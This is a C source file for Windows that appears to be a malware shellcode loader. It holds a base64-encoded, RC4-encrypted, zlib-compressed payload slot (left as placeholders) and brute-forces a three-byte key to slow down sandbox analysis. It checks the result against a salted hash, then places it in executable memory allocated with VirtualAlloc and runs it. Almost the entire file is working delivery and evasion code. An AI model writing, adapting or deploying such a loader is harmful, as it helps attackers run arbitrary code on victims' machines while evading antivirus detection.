#include <windows.h>
#include <string.h>
#include <zlib.h>

// Encrypted shellcode
unsigned char encrypted_shellcode[] = "ENCRYPTED_SHELLCODE_PLACEHOLDER";
unsigned char expected_hash[] = "EXPECTED_HASH_PLACEHOLDER";
unsigned char salt[] = "SALT_PLACEHOLDER";

// Base64 decode table
static const unsigned char b64_table[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

// Base64 decode function
int base64_decode(const unsigned char *src, int src_len, unsigned char *dst) {
    int i, j = 0;
    unsigned char a, b, c, d;
    
    for (i = 0; i < src_len; i += 4) {
        a = b64_table[src[i]];
        b = b64_table[src[i + 1]];
        c = b64_table[src[i + 2]];
        d = b64_table[src[i + 3]];
        
        dst[j++] = (a << 2) | (b >> 4);
        if (c != 64) dst[j++] = (b << 4) | (c >> 2);
        if (d != 64) dst[j++] = (c << 6) | d;
    }
    return j;
}

// Zlib decompressor using uncompress()
int zlib_decompress(const unsigned char *src, int src_len, unsigned char *dst, int dst_max) {
    uLongf dest_len = (uLongf)dst_max;
    int ret = uncompress(dst, &dest_len, src, (uLong)src_len);
    
    if (ret != Z_OK) {
        return 0;
    }
    
    return (int)dest_len;
}

// RC4 state structure
typedef struct {
    unsigned char S[256];
    unsigned char i;
    unsigned char j;
} rc4_state_t;

// RC4 initialization (KSA)
void rc4_init(rc4_state_t *st, const unsigned char *key, int keylen) {
    int i, j = 0;
    unsigned char tmp;
    
    for (i = 0; i < 256; i++) st->S[i] = (unsigned char)i;
    st->i = 0;
    st->j = 0;
    
    for (i = 0; i < 256; i++) {
        j = (j + st->S[i] + key[i % keylen]) % 256;
        tmp = st->S[i];
        st->S[i] = st->S[j];
        st->S[j] = tmp;
    }
    st->i = 0;
    st->j = 0;
}

// RC4 decryption (PRGA)
void rc4_decrypt(rc4_state_t *st, unsigned char *data, int len) {
    int k;
    unsigned char tmp, K;
    
    for (k = 0; k < len; k++) {
        st->i = (st->i + 1) % 256;
        st->j = (st->j + st->S[st->i]) % 256;
        tmp = st->S[st->i];
        st->S[st->i] = st->S[st->j];
        st->S[st->j] = tmp;
        K = st->S[(st->S[st->i] + st->S[st->j]) % 256];
        data[k] ^= K;
    }
}

// djb2 hash for validation
unsigned int djb2_hash(const unsigned char *data, int len) {
    unsigned int hash = 5381;
    int i;
    
    for (i = 0; i < len; i++) {
        hash = ((hash * 33) + data[i]) & 0xFFFFFFFF;
    }
    return hash;
}

// Convert 4 bytes to uint (little-endian)
unsigned int bytes_to_uint(const unsigned char *bytes) {
    return (unsigned int)bytes[0] | 
           ((unsigned int)bytes[1] << 8) | 
           ((unsigned int)bytes[2] << 16) | 
           ((unsigned int)bytes[3] << 24);
}

// Recursive bruteforce to find RC4 key
int bruteforce_key(unsigned char *key, int pos, int max_len, int b64_len, unsigned char *final_shellcode, int *final_len) {
    int i;
    rc4_state_t rc4_state;
    unsigned int calculated_hash;
    unsigned int target_hash = bytes_to_uint(expected_hash);
    
    if (pos == max_len) {
        unsigned char b64_decoded[8192];
        unsigned char rc4_decrypted[8192];
        unsigned char decompressed[8192];
        
        // Decode base64
        int decoded_len = base64_decode(encrypted_shellcode, b64_len, b64_decoded);
        
        // Decrypt with RC4
        memcpy(rc4_decrypted, b64_decoded, decoded_len);
        rc4_init(&rc4_state, key, max_len);
        rc4_decrypt(&rc4_state, rc4_decrypted, decoded_len);
        
        // Decompress with zlib
        int decompressed_len = zlib_decompress(rc4_decrypted, decoded_len, decompressed, 8192);
        
        if (decompressed_len > 0) {
            // Create buffer for hash validation
            unsigned char hash_input[8192];
            memcpy(hash_input, decompressed, decompressed_len);
            int salt_len = sizeof(salt) - 1;
            memcpy(hash_input + decompressed_len, salt, salt_len);
            
            // Calculate hash and validate
            calculated_hash = djb2_hash(hash_input, decompressed_len + salt_len);
            
            if (calculated_hash == target_hash) {
                memcpy(final_shellcode, decompressed, decompressed_len);
                *final_len = decompressed_len;
                return 1;
            }
        }
        return 0;
    }
    
    // Try all possible byte values
    for (i = 1; i <= 255; i++) {
        key[pos] = (unsigned char)i;
        if (bruteforce_key(key, pos + 1, max_len, b64_len, final_shellcode, final_len)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    unsigned char key[3];
    unsigned char final_shellcode[8192];
    int b64_len = sizeof(encrypted_shellcode) - 1;
    int final_len = 0;
    int found = 0;
    
    // Bruteforce RC4 key
    memset(key, 0, sizeof(key));
    if (bruteforce_key(key, 0, 3, b64_len, final_shellcode, &final_len)) {
        found = 1;
    }
    
    if (found && final_len > 0) {
        // Inject and execute shellcode
        void *execs = VirtualAlloc(0, final_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execs) {
            memcpy(execs, final_shellcode, final_len);
            ((void(*)())(execs))();
        }
    }

    return 0;
}